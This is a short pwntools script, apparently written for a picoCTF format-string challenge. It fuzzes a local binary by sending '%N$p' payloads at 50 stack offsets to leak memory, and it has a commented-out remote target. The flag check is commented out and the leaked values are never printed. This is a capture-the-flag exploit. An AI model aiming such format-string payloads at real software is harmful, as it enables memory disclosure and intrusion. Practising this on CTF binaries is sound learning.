#!/bin/python3
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./fmtstr1', checksec=False)

# Let's fuzz 100 values
for i in range(50):
    try:
        # Create process (level used to reduce noise)
        p = process(elf.path)
        # p = remote('saturn.picoctf.net', 53365, level='warn')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'string:','%{}$p'.format(i).encode())
        # Receive the response
        p.recvline()
        result = int(p.recvline(),16)
        # Check for flag
        # if("flag" in str(result).lower()):
       # print(p64(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
